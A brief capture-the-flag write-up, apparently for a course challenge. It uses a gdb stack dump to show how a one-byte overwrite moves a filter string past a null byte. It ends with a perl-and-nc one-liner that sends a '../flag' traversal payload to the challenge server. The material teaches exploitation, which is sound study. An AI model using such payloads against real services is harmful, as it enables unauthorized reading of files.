# analysis

Set a breakpoint right before the `my_getline` function.

```
809e2fb:       e8 fd fd ff ff          call   809e0fd <my_getline>
```


```
Breakpoint 1, 0x0809e2fb in main ()
gdb-peda$ x/64xw $esp
0xffffd380:     0xffffd398      0x00000066      0x00000000      0x00000000
0xffffd390:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3f0:     0x00000000      0x00000000      0x00000000      0x00000063
0xffffd400:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd410:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd420:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd430:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd440:     0x00000000      0x00000000      0x00000000      0x24232221
0xffffd450:     0x28272625      0x2c2b2a29      0x3b3a2f2d      0x3f3e3d3c
0xffffd460:     0x5d5c5b40      0x7b605f5e      0x007e7d7c      0x00000000
0xffffd470:     0xf7f9b000      0x0809e000      0x00000000      0xf7dfee5e
```


The secret `\x63` here will make one byte offset to `\x00`, so we need to
move that to the start of the filter string.

# exploit

```
perl -E 'say ("../flag\x00" . "a"x92 . "\xb4")' | nc secprog.cs.nctu.edu.tw 10002
```
